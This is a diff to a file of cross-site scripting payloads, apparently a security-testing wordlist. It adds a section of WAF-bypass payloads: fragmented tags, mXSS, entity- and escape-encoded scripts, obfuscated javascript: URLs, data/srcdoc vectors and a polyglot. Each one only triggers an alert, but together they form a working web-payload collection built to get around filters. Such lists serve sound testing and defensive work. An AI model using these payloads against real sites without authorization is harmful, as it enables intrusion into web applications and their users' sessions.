@@ -1,6 +1,6 @@
 # Cross-Site Scripting (XSS) payloads
 # Source: https://github.com/swisskyrepo/PayloadsAllTheThings
-# Total: 165 payloads
+# Total: 195 payloads
 <script>alert(1)</script>
 <script>alert('XSS')</script>
 <script>alert(document.domain)</script>
@@ -167,3 +167,40 @@ data:text/html,<script>alert(1)</script>
 "><details open ontoggle=alert(1)><summary>x</summary></details>
 "><img src="x" onerror="alert(1)">
 <svg/onload=confirm(1)>
+
+# --- WAF bypass ---
+# mXSS / tag fragmentation
+<scr<script>ipt>alert(1)</script>
+<img/src=x/onerror=alert(1)>
+<svg/onload=alert(1)>
+<svg%09onload=alert(1)>
+<svg%0aonload=alert(1)>
+<body/onload=alert(1)>
+<math><mtext><table><mglyph><style><!--</style><img title="--><img src=1 onerror=alert(1)>">
+# HTML entity / JS escape
+&#x3c;script&#x3e;alert(1)&#x3c;/script&#x3e;
+&#60;script&#62;alert(1)&#60;/script&#62;
+&#x3csvg&#x20onload&#x3dalert(1)&#x3e
+\x3cscript\x3ealert(1)\x3c/script\x3e
+# javascript: obfuscation
+java%09script:alert(1)
+java%0ascript:alert(1)
+JaVaScRiPt:alert(1)
+javascript&#x3a;alert(1)
+javascript:%61lert(1)
+# data: / vbscript: / srcdoc
+data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==
+vbscript:msgbox(1)
+<iframe srcdoc="&#60;script&#62;alert(1)&#60;/script&#62;"></iframe>
+<iframe srcdoc="<svg onload=alert(1)>"></iframe>
+<object data="data:text/html,<script>alert(1)</script>">
+# polyglots / modern tags
+jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert(1) )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert(1)//>
+"'><svg onload=alert(1)>
+"></title><svg onload=alert(1)>
+<script/src=data:text/javascript,alert(1)>
+<meta http-equiv="refresh" content="0;url=javascript:alert(1)">
+<svg><a xlink:href="javascript:alert(1)"><text>x</text></a></svg>
+<form><button formaction="javascript:alert(1)">x</button></form>
+<base href="javascript:alert(1)//">
+<image src=x onerror=alert(1)>
